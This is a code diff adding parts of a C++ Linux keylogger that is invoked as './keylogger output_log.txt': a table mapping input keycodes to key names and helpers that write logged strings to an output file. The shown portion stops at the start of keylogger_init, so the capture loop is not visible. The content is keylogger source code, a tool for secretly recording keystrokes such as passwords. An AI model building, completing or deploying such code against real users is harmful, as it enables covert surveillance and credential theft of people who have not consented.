@@ -9,9 +9,10 @@
 #include <fcntl.h>
 #include <signal.h>
 #include <unistd.h>
+#include <linux/input.h>
 #include <string.h>
 
-
+#define NUM_KEYCODES 71
 
 using namespace std;
 
@@ -19,9 +20,109 @@ using namespace std;
 // If possible, use the pre-defined keylogger.c to not re-invent the wheel
 // usage: ./keylogger output_log.txt <-- the output file to store the logged data
 
+const char * keycodes[] = {
+    "RESERVED",
+    "ESC",
+    "1",
+    "2",
+    "3",
+    "4",
+    "5",
+    "6",
+    "7",
+    "8",
+    "9",
+    "0",
+    "MINUS",
+    "EQUAL",
+    "BACKSPACE",
+    "TAB",
+    "Q",
+    "W",
+    "E",
+    "R",
+    "T",
+    "Y",
+    "U",
+    "I",
+    "O",
+    "P",
+    "LEFTBRACE",
+    "RIGHTBRACE",
+    "ENTER",
+    "LEFTCTRL",
+    "A",
+    "S",
+    "D",
+    "F",
+    "G",
+    "H",
+    "J",
+    "K",
+    "L",
+    "SEMICOLON",
+    "APOSTROPHE",
+    "GRAVE",
+    "LEFTSHIFT",
+    "BACKSLASH",
+    "Z",
+    "X",
+    "C",
+    "V",
+    "B",
+    "N",
+    "M",
+    "COMMA",
+    "DOT",
+    "SLASH",
+    "RIGHTSHIFT",
+    "KPASTERISK",
+    "LEFTALT",
+    "SPACE",
+    "CAPSLOCK",
+    "F1",
+    "F2",
+    "F3",
+    "F4",
+    "F5",
+    "F6",
+    "F7",
+    "F8",
+    "F9",
+    "F10",
+    "NUMLOCK",
+    "SCROLLLOCK"
+};
+
 void show_usage_and_exit(char* char_pt){
     fprintf(stderr, "Usage: %s output_file\n", char_pt);
     exit(1);
+}
+
+int write_all(int file_desc, const char * str){
+    int bytesWritten = 0;
+    int bytesToWrite = strlen(str) + 1;
+
+    do {
+        bytesWritten = write(file_desc, str, bytesToWrite);
+
+        if(bytesWritten == -1){
+            return 0;
+        }
+        bytesToWrite -= bytesWritten;
+        str += bytesWritten;
+    } while(bytesToWrite > 0);
+
+    return 1;
+}
+
+void write_to_out(int outfd, const char * str, int keyboard_fd){
+    if (!write_all(outfd, str)){
+        close(outfd);
+        close(keyboard_fd);
+        perror("write");
+        exit(1);
+    }
 }
 
 void keylogger_init(int keyboard_fd, int outfd){
